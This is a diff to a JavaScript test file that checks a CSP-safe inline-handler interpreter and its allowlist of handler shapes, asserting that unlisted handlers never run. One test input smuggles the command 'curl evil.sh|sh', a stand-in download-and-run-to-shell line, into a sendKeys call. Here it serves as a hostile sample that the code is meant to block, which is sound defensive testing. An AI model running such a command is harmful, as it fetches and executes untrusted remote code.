@@ -10,6 +10,9 @@ const { pathToFileURL } = require('url');
 (async () => {
     const dir = path.resolve(__dirname, '../../coral-go/pkg/frontend');
     const m = await import(pathToFileURL(path.join(dir, 'static/csp_compat.js')).href);
+    const shapesMod = await import(pathToFileURL(path.join(dir, 'static/csp_shapes.js')).href);
+
+    m._useShapesForTests({ has: () => true }); // interpreter tests below use arbitrary handlers
 
     // ── 1. corpus ────────────────────────────────────────────────────
     const files = [];
@@ -36,6 +39,25 @@ const { pathToFileURL } = require('url');
     }
     assert.ok(total > 400, `expected the corpus to be large, got ${total}`);
     assert.deepStrictEqual(bad, [], `${bad.length} of ${total} inline handlers are outside the CSP-safe grammar:\n` + bad.join('\n'));
+
+    assert.deepStrictEqual([...shapesMod.EVENTS], ['change', 'click', 'contextmenu', 'input', 'keydown', 'mousedown', 'submit'], 'EVENTS is derived from the UI');
+
+    // ── 1b. the real allowlist refuses anything not shaped like a shipped handler ──
+    {
+        const log2 = [];
+        globalThis.removeTagFromSession = (...a) => log2.push(['removeTag', ...a]);
+        globalThis.sendKeys = (...a) => log2.push(['sendKeys', ...a]);
+        const el0 = { closest: () => null };
+        const evx = { stopPropagation() {}, preventDefault() {}, key: 'x' };
+        m._useShapesForTests(null); // the real table
+        m.runHandler("removeTagFromSession('x'); sendKeys('agent-1','curl evil.sh|sh'); foo('', 5)", el0, evx);
+        m.runHandler("sendKeys('a', 'b')", el0, evx);
+        m.runHandler("removeTagFromSession('" + 'a'.repeat(700) + "', 5)", el0, evx);
+        assert.deepStrictEqual(log2, [], 'handlers outside the allowlist must not run at all');
+        m.runHandler("removeTagFromSession('x', 5)", el0, evx);
+        assert.deepStrictEqual(log2, [['removeTag', 'x', 5]], 'a shipped shape still runs');
+        m._useShapesForTests({ has: () => true }); // the remaining checks exercise the interpreter itself
+    }
 
     // ── 2. the grammar refuses code ──────────────────────────────────
     for (const evil of [
